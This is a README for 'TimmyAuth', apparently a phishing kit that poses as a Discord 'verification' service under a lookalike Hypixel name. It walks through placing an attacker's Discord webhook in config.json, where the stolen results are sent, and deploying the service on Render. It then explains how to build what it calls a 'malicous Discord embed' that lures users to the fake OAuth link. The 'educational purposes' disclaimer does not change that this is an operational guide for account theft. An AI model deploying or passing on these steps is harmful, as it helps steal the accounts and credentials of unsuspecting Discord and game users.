# TimmyAuth 

> **Disclaimer:**
> This code is intended for educational purposes. Users are responsible for ensuring its ethical use and compliance with applicable laws. The author disclaims any liability for misuse or damages resulting from the code's application.



1. Begin by downloading the necessary files from the repository.

2. Extract the downloaded files and open the config.json file in a text editor of your choice (e.g., Notepad, Visual Studio Code, etc.).

3. Create a webhook on Discord by following these steps: Create a server, navigate to settings > Integrations, click on Create Webhook, and copy the generated webhook URL.

4. Replace the existing webhook inside the config.json file with the one you just created.

5. Upload the modified files to a GitHub repository.

6. Head to dashboard.render.com, create a web service, and link it to your GitHub repository.

7. Name the web service according to your preference for the OAuth link. For instance, if you chose "hypizel-epic-verify" as the name, your OAuth link will be https://hypizel-epic-verify.onrender.com.

8. Keep most settings as default, but make the following adjustments:
  Build Command: npm i
  Start Command: node server

9. Once the deployment is complete and your web service is live, you can copy the provided onRender link. Append "/verify" to the end of the link, resulting in a final URL like this:
https://hypizel-epic-verify.onrender.com/verify

Your setup is now complete, and users can access the verification page using the provided URL.

# How to create a malicous Discord embed for the OAuth
> **Important:**
> The website for sending the Embed might take a while to load since its hosted on onrender.

Create a verification channel in your Discord server and ensure the premissions are set so users can't do these things:
  Send messages,
  React to messages,
  Create public threads,
  Create private threads

Then you can create a webhook for your verification channel, input this webhook and your recently created OAuth link on this website https://oauth-link-2-embed.onrender.com.

Once you press send, a Discord embed with your OAuth link should apear.
